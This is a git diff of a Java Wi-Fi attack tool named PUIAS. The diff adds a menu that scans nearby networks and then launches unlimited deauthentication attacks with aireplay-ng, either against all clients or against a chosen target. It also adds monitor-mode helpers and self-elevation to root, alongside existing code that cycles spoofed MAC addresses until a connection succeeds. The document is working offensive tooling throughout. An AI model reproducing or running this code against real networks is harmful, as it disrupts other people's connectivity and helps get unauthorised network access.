@@ -1,6 +1,7 @@
 package com.company;
 
 import java.io.*;
+import java.net.URISyntaxException;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Scanner;
@@ -11,17 +12,30 @@ public class Main {
     static String mwi = wi + "mon";
     static boolean monitorMde = false;
 
-    public static void main(String[] args) throws IOException, NoSuchAlgorithmException, InterruptedException {
-        System.out.println("It is highly recommended to run this program with sudo");
+    public static void main(String[] args) throws IOException, URISyntaxException {
+
 
 
         if (System.getProperty("os.name").startsWith("Windows")) { //this program can currently only run on linux
             System.out.println("Please run within the windows ubuntu filesystem.");
-             System.exit(0);
+            System.exit(0);
         } else if (System.getProperty("os.name").startsWith("mac")) {
             System.out.println("Sorry, macOS isn't supported yet, please run from a vm.");
-             System.exit(0);
-        } else checkdep(); //check that necessary dependencies are installed
+            System.exit(0);
+        }
+
+
+        if (!execute("whoami", false).get(0).equals("root")) {
+            System.out.println("run it as root");
+            String path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation()
+                    .toURI()).getPath();
+            executeNewWindow("sudo java -jar "+path,false);
+            System.exit(0);
+        }
+
+        checkdep(); //check that necessary dependencies are installed
+
+
 
 
         System.out.println("Success! PUIAS has been successfully started ");
@@ -52,12 +66,52 @@ public class Main {
 
             }
             if (in.equals("1")) {
-                ArrayList<String> bssid_list = execute("iw " + wi + " scan | egrep '^BSS|SSID:'", true); //scan networks and get bssid and essid
-                System.out.println(bssid_list);
-                for (int i = 0; i < bssid_list.size() - 1; i += 2) { //dor each essid bssid pair
-                    String bss = bssid_list.get(i).split(" ")[1].split("\\(")[0]; //first entry is bssid
-                    String ess = bssid_list.get(i + 1).split(" ")[1]; //second entry is essid
-                    System.out.println(ess + " " + bss);
+                ArrayList<String> network_list = execute("iw " + wi + " scan | egrep '^BSS|SSID:|primary channel:'", true); //scan networks and get bssid and essid
+                ArrayList<String> bssids = new ArrayList<>();
+                ArrayList<String> essids = new ArrayList<>();
+                ArrayList<String> chs = new ArrayList<>();
+
+
+                System.out.println("Enter network to deauth: ");
+                int j = 0; //j will be +1 for each iteration
+                for (int i = 0; i < network_list.size() - 2; i += 3) { //for each essid bssid chanel triplet
+                    String bss = network_list.get(i).split(" ")[1].split("\\(")[0]; //first entry is bssid
+                    String ess = network_list.get(i + 1).split(" ")[1]; //second entry is essid
+
+                    String[] temp = network_list.get(i + 2).split(" ");
+                    String ch = temp[temp.length - 1];
+
+                    System.out.println(j + ". " + ess);
+                    bssids.add(bss);//add each bssid to list
+                    essids.add(ess);//add each essid to list
+                    chs.add(ch);//add each chanel to list
+                    j++;
+                }
+                int sn = Integer.parseInt(scanner.nextLine());
+                String bss = bssids.get(sn);
+                String ess = essids.get(sn);
+                String ch = chs.get(sn);
+                System.out.println("Selected network: " + ess + " with a bssid: " + bss + " and a chanel: " + ch);
+
+                System.out.println("Enter 1 to deauth all, or 2 to select a target");
+                String p = scanner.nextLine();
+                if (p.equals("1")) {
+                    startMonitorMode(ch);
+                    System.out.println(executeNewWindow("aireplay-ng -0 0 -a " + bss + " " + mwi, true));
+                    stopMonitorMode();
+                }
+
+                if (p.equals("2")) {
+                    startMonitorMode(ch);
+                    File scan = new File("scan.txt");
+                    if (scan.exists())
+                        scan.delete();
+                    System.out.println(executeNewWindow("airodump-ng -c " + ch + " --bssid " + bss + " " + mwi + " > scan.txt", true));
+                    while (!scan.exists()) {
+                    }
+
+//                    System.out.println(execute("aireplay-ng -0 100 -a " + bss + " " + mwi, true));
+                    stopMonitorMode();
                 }
 
             }
@@ -75,7 +129,7 @@ public class Main {
                 }
                 for (String mac : macs) {
                     if (trymac(mac)) { //try each mac
-                        System.out.println("success! "+mac); //id succesfull print so
+                        System.out.println("success! " + mac); //id succesfull print so
                         break;
                     }
                 }
@@ -84,19 +138,19 @@ public class Main {
         }
     }
 
-//    public static void startMonitorMode(){
-//        if(!monitorMde){
-//            execute("airmon-ng check kill", true);
-//            execute("airmon-ng start "+wi, true);
-//        }
-//    }
-//
-//    public static void stopMonitorMode(){
-//        if(!monitorMde){
-//            execute("airmon-ng stop "+mwi, true);
-//            execute("service network-manager restart", true);
-//        }
-//    }
+    public static void startMonitorMode(String ch) {
+        if (!monitorMde) {
+            execute("airmon-ng check kill", true);
+            execute("airmon-ng start " + wi + " " + ch, true);
+        }
+    }
+
+    public static void stopMonitorMode() {
+        if (!monitorMde) {
+            execute("airmon-ng stop " + mwi, true);
+            execute("service network-manager restart", true);
+        }
+    }
 
     private static void checkdep() throws IOException {
         System.out.println("checking dep");
@@ -106,7 +160,7 @@ public class Main {
         boolean pkexec = checkpackage("pkexec");
 
 
-        if (!macchanger || !aircrack || !arpscan||!pkexec) {//if any package is missing
+        if (!macchanger || !aircrack || !arpscan || !pkexec) {//if any package is missing
             System.out.println("Error, some of the application requirements are missing");
 
             File dep = new File("dep.sh");
@@ -151,9 +205,10 @@ public class Main {
             command = "pkexec " + command; // if sudo is required append pkexec to the start(graphical request for sudo)
         }
 
+
         ArrayList<String> out = new ArrayList<>();
         try {
-            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command}); //run command
+            Process p = new ProcessBuilder(new String[]{"/bin/sh", "-c", command}).start();
 
             p.waitFor(); //wait for process to complete
 
@@ -174,6 +229,13 @@ public class Main {
         return out;
     }
 
+    private static ArrayList<String> executeNewWindow(String command, boolean sudo) {
+        if(sudo){
+            return execute("sudo x-terminal-emulator -e " + command, false);
+
+        }
+        return execute("x-terminal-emulator -e " + command, false);
+    }
 
     private static ArrayList<String> change_mac(String mac) {
         ArrayList<String> execute = execute("ifconfig " + wi + " down && pkexec macchanger -m " + mac + " " + wi + "&& pkexec ifconfig " + wi + " up", true); //bring adpter down, change mac, bring it back up again
@@ -190,7 +252,7 @@ public class Main {
         }
         ArrayList<String> ping = execute("ping 8.8.8.8 -c 6", false); //ping google dns server and return !( if packet loss was 100% or ping failed)
         System.out.println(ping);
-        return !(ping.contains("100% packet loss") || ping.size() == 0);
+        return !(ping.contains("100% packet loss") || ping.contains("connect: Network is unreachable"));
     }
 
 
